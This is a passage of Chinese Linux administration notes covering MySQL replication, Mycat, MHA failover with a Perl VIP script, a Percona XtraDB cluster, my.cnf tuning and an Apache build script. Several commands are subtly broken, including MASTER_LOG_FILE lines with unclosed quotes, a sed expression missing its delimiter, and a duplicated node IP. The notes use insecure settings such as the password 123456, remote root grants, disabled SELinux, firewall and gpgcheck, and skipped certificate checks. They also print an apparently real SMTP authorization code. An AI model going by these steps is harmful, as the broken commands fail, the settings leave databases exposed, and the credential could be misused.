+----------------------------+-------+ 
mysql> show slave status\G
 Slave_IO_Running: Yes
 Slave_SQL_Running: Yes




##从服务器配置 10.0.0.28
#1.安装插件
root@centos8_1:~# yum -y install mysql-server
root@centos8_1:~# mysql
mysql> INSTALL PLUGIN rpl_semi_sync_slave SONAME 'semisync_slave.so';

#2.配置文件里配置
root@centos8_1:~# vim /etc/my.cnf
[mysqld]
server-id=28
rpl_semi_sync_slave_enabled=ON
[root@centos8 ~]# systemctl restart mysqld

#3.查看配置是否成功
[root@centos8 ~]# mysql
mysql> SHOW GLOBAL VARIABLES LIKE '%semi%';
看到ON就表示成功！！！


#4.与主服务进行关联
CHANGE MASTER TO
MASTER_HOST='10.0.0.8', 
MASTER_USER='repluser', 
MASTER_PASSWORD='123456',
MASTER_PORT=3306,
MASTER_LOG_FILE='centos8-bin.000005，MASTER_LOG_POS=155
mysql> start slave;
mysql> SHOW GLOBAL STATUS LIKE '%semi%';
+----------------------------+-------+
| Variable_name              | Value |
+----------------------------+-------+
| Rpl_semi_sync_slave_status | ON    |
+----------------------------+-------+  
mysql> show slave status\G
 Slave_IO_Running: Yes
 Slave_SQL_Running: Yes
```

![1653721285403](linuxSRE.assets/1653721285403.png)

#### 35.9.5 复制过滤器

```
#复制过滤器就是复制你想要指定的数据库及里面的数据，不指定的其他数据库就不进行复制，即进行数据库的过滤
#在10.0.0.8充当master
#在10.0.0.18充当slave
#在10.0.0.38充当slave

#方法一：
#哪个节点上配影响的是哪个节点
#从节点slave 10.0.0.18
root@centos8_1:~# vim /etc/my.cnf
[mysqld]
server-id=18
rpl_semi_sync_slave_enabled=ON
#只要数据库db1和db2的数据
replicate_do_db=db1  
replicate_do_db=db2
root@centos8_1:~# systemctl restart mysqld



#方法二：(推荐)
[mysqld]
server-id=8
log-bin
binlog-do-db=db1 #配置的二进制日志，影响的是整个他的从节点
rpl_semi_sync_master_enabled=ON
rpl_semi_sync_master_timeout=3000
```

#### 35.9.6Mycat读写分离

![1653745460968](linuxSRE.assets/1653745460968.png)

**1.前置准备**

```
#0.前置准备
服务器共四台
mycat-server 10.0.0.8 #内存建议2G以上
mysql-master 10.0.0.18
mysql-slave  10.0.0.28
client       10.0.0.7

关闭SELinux和防火墙
systemctl stop firewalld
setenforce 0
时间同步
```

**2.10.0.0.8实现Mycat**

```
#10.0.0.8实现Mycat
#1.下载安装mycat的安装包以及java
[root@mycat ~]# wget http://dl.mycat.org.cn/1.6.7.4/Mycat-server-1.6.7.4-release/Mycat-server-1.6.7.4-release-20200105164103-linux.tar.gz
[root@mycat ~]# yum -y install java
[root@centos8 ~]# mkdir /apps
[root@mycat ~]# tar xvf Mycat-server-1.6.7.6-release-20210303094759-linux.tar.gz -C /apps/

#2.配置环境变量
[root@mycat ~]# echo 'PATH=/apps/mycat/bin:$PATH' > /etc/profile.d/mycat.sh
[root@mycat ~]# source /etc/profile.d/mycat.sh

#3.启动mycat
[root@mycat ~]# mycat start
[root@mycat ~]# tail -f /apps/mycat/logs/wrapper.log
#启动成功！！！！
INFO   | jvm 1    | 2022/05/28 23:53:19 | MyCAT Server startup successfully. see logs in logs/mycat.log
[root@mycat ~]# ss -ntl
LISTEN   0         128                      *:8066                   *:*

#4.修改端口号
[root@mycat ~]# vim /apps/mycat/conf/server.xml
#在第45行修改端口号为3306
 <property name="serverPort">3306</property> <property name="managerPort">9066</property>
 <property name="dataNodeIdleCheckPeriod">300000</property> #注意这< /property>行后面会跟了一些内容会使整个服务启动不起来，所以要删除跟在</property>后面饿内容
#在第111行修改默认密码123456
<user name="root">    
<property name="password">123456</property>


#5.修改schema.xml实现读写分离策略
[root@mycat ~]# cp /apps/mycat/conf/schema.xml /apps/mycat/conf/schema.xml.bak2
[root@mycat ~]# vim /apps/mycat/conf/schema.xml
#删除所有内容，把以下的内容全部粘贴过去
<?xml version="1.0"?>
<!DOCTYPE mycat:schema SYSTEM "schema.dtd">

<mycat:schema xmlns:mycat="http://io.mycat/">
  <schema name="TESTDB" checkSQLschema="false" sqlMaxLimit="100" dataNode="dn1"></schema>
  <dataNode name="dn1" dataHost="host1" database="hellodb"/>
  <dataHost name="host1" maxCon="1000" minCon="10" balance="1" writeType="0" dbType="mysql" dbDriver="native" switchType="1" slaveThreshold="100">
    <heartbeat>select user()</heartbeat>
    <!-- can have multi write hosts -->
    <writeHost host="hostM1" url="10.0.0.18:3306" user="root" password="123456">
      <!-- can have multi read hosts -->
      <readHost host="hostS1" url="10.0.0.28:3306" user="root" password="123456"/>
    </writeHost>
  </dataHost>
</mycat:schema>
[root@mycat ~]# mycat restart
[root@mycat ~]# cat /apps/mycat/logs/wrapper.log
#启动服务成功！！！
INFO   | jvm 1    | 2022/05/29 10:47:11 | MyCAT Server startup successfully. see logs in logs/mycat.log
```

**3.10.0.0.18实现master服务器**

```
#1.修改配置文件
root@master:~#
yum -y install mysql-server
root@master:~# vim /etc/my.cnf
[mysqld]
server-id=18
root@master:~# systemctl restart mysqld

#2.创建主从复制授权账号
root@master:~# mysql
mysql> show master logs;
+---------------+-----------+-----------+
| Log_name      | File_size | Encrypted |
+---------------+-----------+-----------+
| binlog.000001 |       155 | No        |
+---------------+-----------+-----------+
1 row in set (0.00 sec)
mysql> create user repluser@'10.0.0.%' identified by '123456';
mysql> grant replication slave on *.* to repluser@'10.0.0.%';
root@master:~# mysqldump -uroot -A -F --single-transaction --master-data=1 --default-character-set=utf8  > /opt/all1.sql
root@master:~# scp /opt/all1.sql  10.0.0.28:

#3.创建mycat配置的root账号和密码
mysql> create user root@'10.0.0.%' identified by '123456';
mysql> grant all on *.* to root@'10.0.0.%';
```

**4.10.0.0.28实现slave服务器**

```
#10.0.0.28实现slave服务器
#1.修改配置文件
[root@slave ~]# yum -y install mysql-server
[root@slave ~]# vim /etc/my.cnf
[mysqld]
server-id=28

#2.实现主从复制之修改完全备份脚本
[root@slave ~]# mysql
#方法一：
CHANGE MASTER TO
MASTER_HOST='10.0.0.18', 
MASTER_USER='repluser', 
MASTER_PASSWORD='123456',
MASTER_PORT=3306,
MASTER_LOG_FILE='centos8-bin.000002，MASTER_LOG_POS=155;

#方法二：
[root@slave ~]# vim all1.sql
CHANGE MASTER TO
MASTER_HOST='10.0.0.18', 
MASTER_USER='repluser', 
MASTER_PASSWORD='123456',
MASTER_PORT=3306,
MASTER_LOG_FILE='centos8-bin.000002，MASTER_LOG_POS=155
[root@slave ~]# mysql < all1.sql


#3.开启从线程
mysql> start slave;
mysql> show slave status\G


#4.查看是否同步主master的授权账号
mysql> select user,host from mysql.user;
+------------------+-----------+
| user             | host      |
+------------------+-----------+
| repluser         | 10.0.0.%  |
| root             | 10.0.0.%  |
| mysql.infoschema | localhost |
| mysql.session    | localhost |
| mysql.sys        | localhost |
| root             | localhost |
+------------------+-----------+
6 rows in set (0.01 sec)

#5.开启通用日志
mysql> show variables like 'general%';
mysql> set global general_log=1;
[root@slave ~]# tail -f /var/lib/mysql/slave.log
```

**5.10.0.0.7客户端**

```
#10.0.0.7客户端
#1.测试第一次连接
[09:31:25 root@centos7 ~]#mysql -uroot -p123456 -h 10.0.0.8 -P8066 #mycat默认密码123456
Server version: 5.6.29-mycat-1.6.7.6-release-20210303094759 MyCat Server (OpenCloudDB)
MySQL [(none)]> show databases;
mycat虚拟出来的假表
+----------+
| DATABASE |
+----------+
| TESTDB   |
+----------+

#2.测试第二次连接
#修改端口号为3306和密码
[11:20:52 root@centos7 ~]#mysql -uroot -p123456 -h 10.0.0.
```

范例：schema.xml

![1653818712890](linuxSRE.assets/1653818712890.png)

#### 35.9.10 MySQL高可用

##### 35.9.10.1MHA工作原理和架构

```
#1.什么是MHA
MHA：Master High Availability，对主节点进行监控，可实现自动故障转移至其它从节点；通过提升某一从节点为新的主节点，基于主从复制实现，还需要客户端配合实现，目前MHA主要支持
一主多从的架构，要搭建MHA,要求一个复制集群中必须最少有三台数据库服务器，一主二从，即一台充当master，一台充当备用master，另外一台充当从库，出于机器成本的考虑，淘宝进行了改造，目前淘宝TMHA已经支持一主一从



#2.MHA的工作原理
1. 从宕机崩溃的master保存二进制日志事件（binlog events）
2. 识别含有最新更新的slave
3. 应用差异的中继日志（relay log）到其他的slave
4. 应用从master保存的二进制日志事件（binlog events）
5. 提升一个slave为新的master
6. 使其他的slave连接新的master进行复制
```

![1653820640620](linuxSRE.assets/1653820640620.png)

##### 35.9.10.2 实现MHA集群

![1653821358283](linuxSRE.assets/1653821358283.png)

**1.环境准备：**

```
#1.环境:四台主机
10.0.0.7 CentOS7 MHA管理端
10.0.0.8 CentOS8 Master
10.0.0.18 CentOS8 Slave1
10.0.0.28 CentOS8 Slave2

#2.需要包的下载地址：https://github.com/yoshinorim/mha4mysql-node/releases/tag/v0.58

#3.每台机器需要的包
10.0.0.7:mha4mysql-manager和mha4mysql-node
10.0.0.8:mha4mysql-node
10.0.0.18:mha4mysql-node
10.0.0.28:mha4mysql-node
```

**2.修改配置10.0.0.7**

```
10.0.0.7 CentOS7 MHA管理端
#1.安装rpm包
[20:20:44 root@mha-manager ~]#yum -y install mha4mysql-*.rpm


#2.在所有节点实现相互之间ssh key验证
[20:26:04 root@mha-manager ~]#ssh-keygen
[20:26:04 root@mha-manager ~]#ssh-copy-id 127.0.0.1
[20:28:20 root@mha-manager ~]#rsync -av .ssh 10.0.0.8:/root/
[20:28:20 root@mha-manager ~]#rsync -av .ssh 10.0.0.18:/root/
[20:28:20 root@mha-manager ~]#rsync -av .ssh 10.0.0.28:/root/


#3.在管理节点建立配置文件
[20:31:06 root@mha-manager ~]#mkdir /etc/mastermha/
[20:35:49 root@mha-manager ~]#vim /etc/mastermha/app1.cnf
set list查看空格：一定要结尾不带任何空格
[server default]
user=mhauser
password=123456
manager_workdir=/data/mastermha/app1/
manager_log=/data/mastermha/app1/manager.log
remote_workdir=/data/mastermha/app1/
ssh_user=root
repl_user=repluser
repl_password=123456
ping_interval=1
master_ip_failover_script=/usr/local/bin/master_ip_failover
report_script=/usr/local/bin/sendmail.sh
check_repl_delay=0
master_binlog_dir=/data/mysql/

[server1]
hostname=10.0.0.8
candidate_master=1
[server2]
hostname=10.0.0.18
candidate_master=1
[server3]
hostname=10.0.0.28


#4.搭建邮件服务
[20:49:53 root@mha-manager ~]#vim /etc/mail.rc
set from=1805336068@qq.com
set smtp=smtp.qq.com
set smtp-auth-user=1805336068@qq.com
set smtp-auth-password=mkmzfnyrjkojbgfg

#5.相关脚本
[20:53:31 root@mha-manager ~]#cat > /usr/local/bin/sendmail.sh
#!/bin/bash
echo "MySQL is down" | mail -s "MHA Warning" 1805336068@qq.com
^C
[20:57:52 root@mha-manager ~]#bash /usr/local/bin/sendmail.sh #测试邮件是否能发成功
[20:57:59 root@mha-manager ~]#chmod +x /usr/local/bin/sendmail.sh

#5.1perl脚本
[20:57:59 root@mha-manager ~]# vim /usr/local/bin/master_ip_failover
#!/usr/bin/env perl
use strict;
use warnings FATAL => 'all';
use Getopt::Long;
my (
$command, $ssh_user, $orig_master_host, $orig_master_ip,
$orig_master_port, $new_master_host, $new_master_ip, $new_master_port
);
my $vip = '10.0.0.100/24';
my $gateway = '10.0.0.2';
my $interface = 'eth0';
my $key = "1";
my $ssh_start_vip = "/sbin/ifconfig $interface:$key $vip;/sbin/arping -I 
$interface -c 3 -s $vip $gateway >/dev/null 2>&1";
my $ssh_stop_vip = "/sbin/ifconfig $interface:$key down";
GetOptions(
'command=s' => \$command,
'ssh_user=s' => \$ssh_user,
'orig_master_host=s' => \$orig_master_host,
'orig_master_ip=s' => \$orig_master_ip,
'orig_master_port=i' => \$orig_master_port,
'new_master_host=s' => \$new_master_host,
'new_master_ip=s' => \$new_master_ip,
'new_master_port=i' => \$new_master_port,
);
exit &main();
sub main {
print "\n\nIN SCRIPT TEST====$ssh_stop_vip==$ssh_start_vip===\n\n";
if ( $command eq "stop" || $command eq "stopssh" ) { 
# $orig_master_host, $orig_master_ip, $orig_master_port are passed.
# # If you manage master ip address at global catalog database,
# # invalidate orig_master_ip here.
my $exit_code = 1;
eval {
print "Disabling the VIP on old master: $orig_master_host \n";
&stop_vip();
$exit_code = 0;
};
if ($@) {
warn "Got Error: $@\n";
exit $exit_code;
}
exit $exit_code;
}
elsif ( $command eq "start" ) {
# all arguments are passed.
# # If you manage master ip address at global catalog database,
# # activate new_master_ip here.
# # You can also grant write access (create user, set read_only=0, etc) here.
my $exit_code = 10;
eval {
print "Enabling the VIP - $vip on the new master - $new_master_host \n";
&start_vip();
$exit_code = 0;
};
if ($@) {
warn $@;
exit $exit_code;
}
exit $exit_code;
}
elsif ( $command eq "status" ) {
print "Checking the Status of the script.. OK \n";
`ssh $ssh_user\@$orig_master_host \" $ssh_start_vip \"`;
exit 0;
}
else {
&usage();
exit 1;
}
}
sub start_vip() {
`ssh $ssh_user\@$new_master_host \" $ssh_start_vip \"`;
}
sub stop_vip() {
`ssh $ssh_user\@$orig_master_host \" $ssh_stop_vip \"`;
}
sub usage {
print
"Usage: master_ip_failover --command=start|stop|stopssh|status --
orig_master_host=host --orig_master_ip=ip --orig_master_port=port --
new_master_host=host --new_master_ip=ip --new_master_port=port\n";
}



#5.2移动到指定目录
[21:13:45 root@mha-manager ~]#mv master_ip_failover /usr/local/bin/
[21:16:47 root@mha-manager ~]#chmod +x /usr/local/bin/master_ip_failover


#6.检查环境
#只要有一个错了下面的进行不下去了
[22:17:24 root@mha-manager ~]#masterha_check_ssh --conf=/etc/mastermha/app1.cnf
Sun May 29 22:17:29 2022 - [info] All SSH connection tests passed successfully.
[22:29:55 root@mha-manager ~]#masterha_check_repl --conf=/etc/mastermha/app1.cnf
#成功提示：
MySQL Replication Health is OK.
#错误提示：
#1.出现如下错误
Sun May 29 22:33:30 2022 - [error][/usr/share/perl5/vendor_perl/MHA/Server.pm, ln180] Got MySQL error when connecting 10.0.0.28(10.0.0.28:3306) :1130:Host '10.0.0.7' is not allowed to connect to this MySQL server, but this is not a MySQL crash. Check MySQL server settings.

解决办法：
1.改表法
mysql> use mysql;
mysql> update user set host = '%' where user = 'root';
mysql> FLUSH PRIVILEGES;
2.授权法
GRANT ALL PRIVILEGES ON *.* TO 'root'@'192.168.1.3' IDENTIFIED BY 'mypassword' WITH GRANT OPTION;


#7.查看状态
[22:37:16 root@mha-manager ~]#masterha_check_status --conf=/etc/mastermha/app1.cnf
#表示还没有运行
app1 is stopped(2:NOT_RUNNING).
#表示已经运行
app1 (pid:15413) is running(0:PING_OK), master:10.0.0.8



#8.启动MHA，默认后台运行
nohup masterha_manager --conf=/etc/mastermha/app1.cnf &> /dev/null


#9.排错日志
[23:00:23 root@mha-manager ~]#tail -f /data/mastermha/app1/manager.log
```

**3.修改配置10.0.0.8**

```
10.0.0.8 CentOS8 Master
#1.安装包
[root@master ~]# yum -y install mha4mysql-node-0.58-0.el7.centos.noarch.rpm


#2.实现主从复制
[root@master ~]# yum -y install mysql-server
[root@master ~]# mkdir /data/mysql/
[root@master ~]# chown mysql.mysql /data/mysql/
[root@master ~]# vim /etc/my.cnf
[mysqld]
server_id=8
log-bin=/data/mysql/mysql-bin
skip_name_resolve=1
general_log
[root@master ~]# systemctl enable --now mysqld
[root@master ~]# mysql
mysql> show master logs;
+------------------+-----------+-----------+
| Log_name         | File_size | Encrypted |
+------------------+-----------+-----------+
| mysql-bin.000001 |       178 | No        |
| mysql-bin.000002 |      1247 | No        |
| mysql-bin.000003 |       155 | No        |
+------------------+-----------+-----------+
3 rows in set (0.00 sec)
mysql> create user repluser@'10.0.0.%' identified by '123456';
mysql> grant replication slave on *.* to repluser@'10.0.0.%';
mysql> create user mhauser@'10.0.0.%' identified by '123456';
mysql>  grant all on *.* to mhauser@'10.0.0.%';
[root@master ~]# mysqldump -uroot -A -F --single-transaction --master-data=1 --default-character-set=utf8  > /opt/all.sql
[root@master ~]# scp /opt/all.sql  10.0.0.18:
[root@master ~]# scp /opt/all.sql  10.0.0.28:


#3.配置VIP
[root@master ~]# ifconfig eth0:1 10.0.0.100/24



#4.查看MHA监控
[root@master ~]# tail -f /var/lib/mysql/master.log
#每一秒发出一次查询请求
2022-05-29T15:03:24.540333Z	   21 Query	SELECT 1 As Value
2022-05-29T15:03:25.541542Z	   21 Query	SELECT 1 As Value
2022-05-29T15:03:26.542676Z	   21 Query	SELECT 1 As Value
```

**4.修改配置10.0.0.18**

```
10.0.0.18 CentOS8 Slave1
root@slave1:~# yum -y install mha4mysql-node-0.58-0.el7.centos.noarch.rpm
root@slave1:~# yum -y install mysql-server

#1.实现主从复制
[root@master ~]# mkdir /data/mysql/
[root@master ~]# chown mysql.mysql /data/mysql/
[root@master ~]# vim /etc/my.cnf
[mysqld]
server_id=28
log-bin=/data/mysql/mysql-bin
read_only
relay_log_purge=0
skip_name_resolve=1
general_log

root@slave1:~# systemctl enable --now mysqld
root@slave1:~# vim all.sql
CHANGE MASTER TO 
MASTER_HOST='10.0.0.8',
MASTER_USER='repluser',
MASTER_PASSWORD='123456',
MASTER_PORT=3306,
MASTER_LOG_FILE='mysql-bin.000003', MASTER_LOG_POS=155;

root@slave1:~# mysql < all.sql
mysql> start slave;
mysql> show slave status\G;
#如果发生错误重新清理线程
mysql> reset slave all;
```

**5.修改配置10.0.0.28**

```
10.0.0.28 CentOS8 Slave2
[root@slave2 ~]# yum -y install mha4mysql-node-0.58-0.el7.centos.noarch.rpm
[root@slave2 ~]# yum -y install mysql-server

#1.实现主从复制
[root@master ~]# mkdir /data/mysql/
[root@master ~]# chown mysql.mysql /data/mysql/
[root@master ~]# vim /etc/my.cnf
[mysqld]
server_id=28
log-bin=/data/mysql/mysql-bin
read_only
relay_log_purge=0
skip_name_resolve=1
general_log
[root@slave2 ~]# systemctl enable --now mysqld
root@slave1:~# vim all.sql
CHANGE MASTER TO 
MASTER_HOST='10.0.0.8',
MASTER_USER='repluser',
MASTER_PASSWORD='123456',
MASTER_PORT=3306,
MASTER_LOG_FILE='mysql-bin.000003', MASTER_LOG_POS=155;

root@slave1:~# mysql < all.sql
mysql> start slave;
mysql> show slave status\G;
#如果发生错误重新清理线程
mysql> reset slave all;
```

##### 35.9.10.3实现PXC集群

```
#0.PXC特点
多主架构：真正的多点读写的集群，在任何时候读写数据，都是最新的
同步复制：集群不同节点之间数据同步，没有延迟，在数据库挂掉之后，数据不会丢失
并发复制：从节点APPLY数据时，支持并行执行，更好的性能
故障切换：在出现数据库故障时，因支持多点写入，切换容易
热插拔：在服务期间，如果数据库挂了，只要监控程序发现的够快，不可服务时间就会非常少。在
节点故障期间，节点本身对集群的影响非常小
自动节点克隆：在新增节点，或者停机维护时，增量数据或者基础数据不需要人工手动备份提供，
Galera Cluster会自动拉取在线节点数据，最终集群会变为一致
对应用透明：集群的维护，对应用程序是透明的
```

![1653877952183](linuxSRE.assets/1653877952183.png)

**1.环境准备**

```
pxc1:10.0.0.7
pxc2:10.0.0.17
pxc3:10.0.0.27
pxc4:10.0.0.37

OS 版本目前不支持CentOS 8
关闭防火墙和SELinux，保证时间同步
注意：如果已经安装MySQL，必须卸载
```

**2.pxc1:10.0.0.7**

```
#1.配置清华大学yum源
[10:36:23 root@pxc1 ~]#vim /etc/yum.repos.d/pxc.repo
[percona]
name=percona_repo
baseurl = https://mirrors.tuna.tsinghua.edu.cn/percona/release/$releasever/RPMS/$basearch
enabled = 1
gpgcheck = 0
[10:49:09 root@pxc1 ~]#scp /etc/yum.repos.d/pxc.repo 10.0.0.17:/etc/yum.repos.d/
[10:49:09 root@pxc1 ~]#scp /etc/yum.repos.d/pxc.repo 10.0.0.27:/etc/yum.repos.d/
[10:49:09 root@pxc1 ~]#scp /etc/yum.repos.d/pxc.repo 10.0.0.37:/etc/yum.repos.d/



#2.安装包
[11:03:52 root@pxc1 ~]#yum install Percona-XtraDB-Cluster-57 -y



#3.修改PXC的配置文件
[11:14:36 root@pxc1 ~]#vim /etc/percona-xtradb-cluster.conf.d/wsrep.cnf
#in order to do that you need to bootstrap this node
wsrep_cluster_address=gcomm://10.0.0.7,10.0.0.17,10.0.0.27 #指定你要搭建的集群
# Node IP address
wsrep_node_address=10.0.0.7 #指定本机的ip
#Authentication for SST method
wsrep_sst_auth="sstuser:s3cretPass" #账号密码

#If wsrep_node_name is not specified,  then system # Cluster name
wsrep_cluster_name=pxc-cluster-liu

#If wsrep_node_name is not specified,  then system hostname will be used
wsrep_node_name=pxc-cluster-node-1-liu #一定要注意node-1,node-2,node-3的写，不然后续大坑！！

#Authentication for SST method
wsrep_sst_auth="sstuser:s3cretPass"

[11:39:17 root@pxc1 ~]#scp /etc/percona-xtradb-cluster.conf.d/wsrep.cnf 10.0.0.17:/etc/percona-xtradb-cluster.conf.d/wsrep.cnf   
[11:40:12 root@pxc1 ~]#scp /etc/percona-xtradb-cluster.conf.d/wsrep.cnf 10.0.0.27:/etc/percona-xtradb-cluster.conf.d/wsrep.cnf



#4.启动PXC集群中第一个节点
[11:40:32 root@pxc1 ~]#systemctl start mysql@bootstrap.service



#5.查看root临时密码
[root@pxc1 ~]# grep "temporary password" /var/log/mysqld.log
2022-05-30T18:13:04.385327Z 1 [Note] A temporary password is generated for root@localhost: Fv)vKh#pl2k9


#5.修改密码
[root@pxc1 ~]# mysql -uroot -p'Fv)vKh#pl2k9'
mysql> alter user 'root'@'localhost' identified by '123456';


#6.#创建相关用户并授权
mysql> CREATE USER 'sstuser'@'localhost' IDENTIFIED BY 's3cretPass';
mysql> GRANT RELOAD, LOCK TABLES, PROCESS, REPLICATION CLIENT ON *.* TO 'sstuser'@'localhost';
#查看相关状态变量

*************************** 66. row ***************************
Variable_name: wsrep_cluster_size：Value: 1
[root@pxc1 ~]# mysql -uroot -p123456 -e " show status like 'wsrep%'" |grep size
wsrep_cert_index_size	1
wsrep_gcache_pool_size	2456
wsrep_cluster_size	3  #已经连接的三个集群
```

**3.pxc2:10.0.0.17**

```
#1.安装包
[11:03:52 root@pxc2 ~]#yum install Percona-XtraDB-Cluster-57 -y


#2.修改PXC的配置文件
[root@pxc2 ~]# vim /etc/percona-xtradb-cluster.conf.d/wsrep.cnf
#in order to do that you need to bootstrap this node
wsrep_cluster_address=gcomm://10.0.0.7,10.0.0.17,10.0.0.27
# Node IP address
wsrep_node_address=10.0.0.17 #指定本机的ip
# Cluster name
wsrep_cluster_name=pxc-cluster-liu

#If wsrep_node_name is not specified,  then system hostname will be used
wsrep_node_name=pxc-cluster-node-2-liu

#Authentication for SST method
wsrep_sst_auth="sstuser:s3cretPass"

#3.启动服务
[root@pxc2 ~]# systemctl start mysql
```

**4.pxc3:10.0.0.27**

```
#1.安装包
[11:03:52 root@pxc3 ~]#yum install Percona-XtraDB-Cluster-57 -y


#2.修改PXC的配置文件
[root@pxc2 ~]# vim /etc/percona-xtradb-cluster.conf.d/wsrep.cnf
# Node IP address
wsrep_node_address=10.0.0.27 #指定本机的ip
# Cluster name
wsrep_cluster_name=pxc-cluster-liu

#If wsrep_node_name is not specified,  then system hostname will be used
wsrep_node_name=pxc-cluster-node-3-liu


#3.启动服务
[root@pxc2 ~]# systemctl start mysql
```

**5.pxc4:10.0.0.37**

```
#1.安装包
[11:03:52 root@pxc4 ~]#yum install Percona-XtraDB-Cluster-57 -y

#2.修改PXC的配置文件
[root@pxc2 ~]# vim /etc/percona-xtradb-cluster.conf.d/wsrep.cnf
# Node IP address
wsrep_node_address=10.0.0.27 #指定本机的ip
# Cluster name
wsrep_cluster_name=pxc-cluster-liu

#If wsrep_node_name is not specified,  then system hostname will be used
wsrep_node_name=pxc-cluster-node-4-liu


#3.启动服务
[root@pxc2 ~]# systemctl start mysql
```

#### 35.10生产环境my.cnf配置案例

```
#打开独立表空间
innodb_file_per_table = 1
#MySQL 服务所允许的同时会话数的上限，经常出现Too Many Connections的错误提示，则需要增大此值
max_connections = 8000
#所有线程所打开表的数量
open_files_limit = 10240
#back_log 是操作系统在监听队列中所能保持的连接数
back_log = 300
#每个客户端连接最大的错误允许数量，当超过该次数，MYSQL服务器将禁止此主机的连接请求，直到MYSQL
服务器重启或通过flush hosts命令清空此主机的相关信息
max_connect_errors = 1000
#每个连接传输数据大小.最大1G，须是1024的倍数，一般设为最大的BLOB的值
max_allowed_packet = 32M #指定一个请求的最大连接时间
wait_timeout = 10
# 排序缓冲被用来处理类似ORDER BY以及GROUP BY队列所引起的排序
sort_buffer_size = 16M 
#不带索引的全表扫描.使用的buffer的最小值
join_buffer_size = 16M 
#查询缓冲大小
query_cache_size = 128M #指定单个查询能够使用的缓冲区大小，缺省为1M
query_cache_limit = 4M    
# 设定默认的事务隔离级别
transaction_isolation = REPEATABLE-READ
# 线程使用的堆大小. 此值限制内存中能处理的存储过程的递归深度和SQL语句复杂性，此容量的内存在每次连接时被预留.
thread_stack = 512K 
# 二进制日志功能
log-bin=/data/mysqlbinlogs/
#二进制日志格式
binlog_format=row
#InnoDB使用一个缓冲池来保存索引和原始数据, 可设置这个变量到物理内存大小的80%
innodb_buffer_pool_size = 24G 
#用来同步IO操作的IO线程的数量
innodb_file_io_threads = 4 #在InnoDb核心内的允许线程数量，建议的设置是CPU数量加上磁盘数量的两倍
innodb_thread_concurrency = 16
# 用来缓冲日志数据的缓冲区的大小
innodb_log_buffer_size = 16M
在日志组中每个日志文件的大小
innodb_log_file_size = 512M 
# 在日志组中的文件总数
innodb_log_files_in_group = 3
# SQL语句在被回滚前,InnoDB事务等待InnoDB行锁的时间
innodb_lock_wait_timeout = 120
#慢查询时长
long_query_time = 2 #将没有使用索引的查询也记录下来
log-queries-not-using-indexes
```

## 36.WEB服务器APACHE

### 36.1 浏览器访问网站过程

![1654612514416](linuxSRE.assets/1654612514416.png)

### 36.2HTTP请求访问的过程

![1654424026430](linuxSRE.assets/1654424026430.png)

### 36.3MPM工作模式

**prefork：**多进程I/O模型，每个进程响应一个请求，CentOS 7 httpd默认模型

一个主进程：生成和回收n个子进程，创建套接字，不响应请求

多个子进程：工作 work进程，每个子进程处理一个请求；系统初始时，预先生成多个空闲进程，等待请求

![1654567612500](linuxSRE.assets/1654567612500.png)

Prefork MPM预派生模式，有一个主控制进程，然后生成多个子进程,每个子进程有一个独立的线程响应用户请求，相对比较占用内存，但是比较稳定，可以设置最大和最小进程数，是最古老的一种模式，也是最稳定的模式，适用于访问量不是很大的场景

优点：稳定

缺点：慢，占用资源，不适用于高并发场景



**worker：**复用的多进程I/O模型,多进程多线程，IIS使用此模型

一个主进程：生成m个子进程，每个子进程负责生个n个线程，每个线程响应一个请求，并发响应请求：m*n

![1654567710885](linuxSRE.assets/1654567710885.png)

优点：相比prefork 占用的内存较少，可以同时处理更多的请求

缺点：使用keep-alive的长连接方式，某个线程会一直被占据，即使没有传输数据，也需要一直等待到超时才会被释放。如果过多的线程，被这样占据，也会导致在高并发场景下的无服务线程可用。（该问题在prefork模式下，同样会发生）



**event：**事件驱动模型（worker模型的变种），CentOS8 默认模型

![1654567780901](linuxSRE.assets/1654567780901.png)

一个主进程：生成m个子进程，每个子进程负责生个n个线程，每个线程响应一个请求，并发响应请求：m*n，有专门的监控线程来管理这些keep-alive类型的线程，当有真实请求时，将请求传递给服务线程，执行完毕后，又允许释放。这样增强了高并发场景下的请求处理能力



优点：单线程响应多请求，占据更少的内存，高并发下表现更优秀，会有一个专门的线程来管理keep-alive类型的线程，当有真实请求过来的时候，将请求传递给服务线程，执行完毕后，又允许它释放

缺点：没有线程安全控制

### 36.4编译安装httpd-2.4.53

```
###################################################################
# File Name: install_httpd.sh
# Author: liusenbiao
# mail: 1805336068@qq.com
# Created Time: Mon 06 Jun 2022 11:22:37 AM CST
#=============================================================
#!/bin/bash
APR_URL=https://mirrors.tuna.tsinghua.edu.cn/apache/apr/
APR_FILE=apr-1.7.0
TAR=.tar.bz2
APR_UTIL_URL=https://mirrors.tuna.tsinghua.edu.cn/apache/apr/
APR_UTIL_FILE=apr-util-1.6.1
HTTPD_URL=https://mirrors.tuna.tsinghua.edu.cn/apache/httpd/
HTTPD_FILE=httpd-2.4.53
INSTALL_DIR=/data/httpd-2.4.53
CPUS=`lscpu | awk '/^CPU\(s\)/{print $2}'`
MPM=event
install_httpd(){
if [ `awk -F'"' '/^ID=/{print $2}' /etc/os-release` == "centos" ] &> /dev/null;then
  yum -y install gcc make expat-devel pcre-devel openssl-devel wget bzip2
else
  sudo apt update
  sudo apt -y install gcc libapr1-dev libaprutil1-dev libpcre3 libpcre3-dev libssl-dev wget make
fi

cd /usr/local/src
wget $APR_URL$APR_FILE$TAR --no-check-certificate && wget $APR_UTIL_URL$APR_UTIL_FILE$TAR --no-check-certificate  && wget $HTTPD_URL$HTTPD_FILE$TAR --no-check-certificate
tar xf $APR_FILE$TAR && tar xf $APR_UTIL_FILE$TAR && tar xf $HTTPD_FILE$TAR
mv $APR_FILE $HTTPD_FILE/srclib/apr
mv $APR_UTIL_FILE $HTTPD_FILE/srclib/apr-util
cd $HTTPD_FILE
./configure --prefix=$INSTALL_DIR --enable-so --enable-ssl --enable-cgi --enable-rewrite --with-zlib --with-pcre --with-included-apr --enable-modules=most --enable-mpms-shared=all --with-mpm=$MPM
make -j $CPUS && make install
useradd -s /sbin/nologin -r apache
sed -i 's/daemon/apache' $INSTALL_DIR/conf/httpd.conf
echo "PATH=$INSTALL_DIR/bin:$PATH" > /etc/profile.d/$HTTPD_FILE.sh
. /etc/profile.d/$HTTPD_FILE.sh
cat > /lib/systemd/system/httpd.service <<EOF
[Unit]
Description=The Apache HTTP Server
After=network.target remote-fs.target nss-lookup.target
Documentation=man:httpd(8)
Documentation=man:apachectl(8)
[Service]
Type=forking
ExecStart=${INSTALL_DIR}/bin/apachectl start
ExecReload=${INSTALL_DIR}/bin/apachectl graceful
ExecStop=${INSTALL_DIR}/bin/apachectl stop
killSignal=SIGCONT
